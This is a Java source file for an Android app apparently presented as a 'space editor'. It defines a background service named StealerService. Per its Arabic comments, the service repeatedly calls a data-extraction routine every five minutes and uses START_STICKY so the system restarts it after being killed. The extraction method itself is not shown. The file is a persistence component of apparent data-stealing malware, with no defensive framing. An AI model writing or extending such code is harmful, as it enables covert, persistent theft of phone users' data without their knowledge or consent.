package com.example.spaceeditor;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class StealerService extends Service {
    private Thread workerThread;
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        isRunning = true;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (workerThread == null || !workerThread.isAlive()) {
            workerThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    while (isRunning) {
                        try {
                            // الكود اللي بيسحب البيانات (هيتنفذ كل 5 دقايق في الخلفية)
                            MainActivity.extractDataInBackground(StealerService.this);
                            Thread.sleep(300000); // 5 دقائق
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
            workerThread.start();
        }
        return START_STICKY; // عشان لو النظام قفله، يرجع يشتغل تاني
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
